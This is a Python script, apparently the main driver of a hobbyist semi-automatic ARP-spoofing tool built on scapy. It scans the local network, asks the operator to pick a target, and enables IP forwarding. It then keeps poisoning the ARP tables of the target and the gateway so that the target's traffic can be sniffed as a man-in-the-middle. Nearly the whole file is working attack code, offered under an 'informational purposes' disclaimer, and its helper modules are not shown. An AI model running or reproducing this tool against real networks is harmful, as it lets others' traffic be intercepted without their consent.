from scan import *
from arp_spoof import *


#  ------  This is my own project, which implements semi-automatic ARP-spoofing.
#
# This material was created for informational purposes.
# The information is provided solely for the purpose of familiarization.
# The author strongly condemns any kind of hacker attacks and encourages to pay attention to security problems.
#
# First of all, we find the network participants, using arp requests we find out their mac addresses ('Who it is').
# Then, in fact, a MITM attack is carried out on some user of our network (we will call him target).
# There is a substitution of IP and MAC in the target and gateway ARP tables, after which all traffic passes through us.
# Then, thanks to sniffer (which is embedded in the code), we can view this traffic.
# Additional filters and decoders are also implemented, which simplify working with traffic and our lives :)...
# Many thanks to the scapy module for almost all the work done for me.
#


def main():

    if not os.getuid() == 0:
        print("\n----------- Please, run with SUDO ! -----------")
        return

    #try:
    if 1==1:
        print("----- Choose interface ( default: wlan0) ----- ")
        interface = input("---> ")
        if ( len(interface) == 0):
            interface = "wlan0"

        local_ip = get_local_ip()
        gateway_ip = get_gateway_ip()
        prefix = get_prefix(local_ip)

        print("----- Enter search accuracy ( 0 < default 0.5 < 1) -----")
        accuracy = input("---> ")
        if (len(accuracy) == 0):
            accuracy = "0.5"
        accuracy = get_accuracy(float(accuracy),int(prefix))

        mac_ip_list = []

        while True:
            print(f"\n----------- Your local IP is  -->  {local_ip}/{prefix} ----------- ")
            print(f"----------- Gateway  IP  is   -->  {gateway_ip}  -----------")

            for i in range(int(accuracy)):
                #mac_ip_l = get_ip_mac_addr(generate_ip(local_ip,prefix))  #1 way
                mac_ip_l = scapy_arp(generate_ip(local_ip,prefix))         #2 way
                print(f"---- {i+1} operation ----")
                if(len(mac_ip_l) > len(mac_ip_list)):
                    mac_ip_list = mac_ip_l
            neigh = ipneigh_ip_mac()
            if(len(mac_ip_list) < len(neigh)):
                mac_ip_list = neigh
            if not (len(mac_ip_list) == 0):
                output_mac_ip_table(mac_ip_list)

            print("\n- Do you want to continue or update table(enter 'up') -")
            answer = input("---> ")
            if not "up" in answer:
                break

        print("----- Enter target IP -----")
        target_ip = input("---> ")

        if not check_ip_forwarding():
            ip_forwarding(1)

        target_ip_mac = get_mac_by_ip(target_ip)
        spoof_ip_mac = get_mac_by_ip(gateway_ip)

        packet_count = 0

        try:

            while True:
                arp_spoof(target_ip_mac, spoof_ip_mac)
                arp_spoof(spoof_ip_mac, target_ip_mac)
                packet_count += 2
                print(f"----- Send {packet_count} packets -----")
                print("----- SNIFF PLSSS -----")
                time.sleep(2)
        except KeyboardInterrupt:
            restore_arp_table(target_ip_mac, spoof_ip_mac)
            restore_arp_table(spoof_ip_mac, target_ip_mac)
            print("----- Arp tables have restored ! ----- ")

    #except BaseException:
        #print("Oooops, something wrong...... ")





if __name__ == '__main__':
    main()
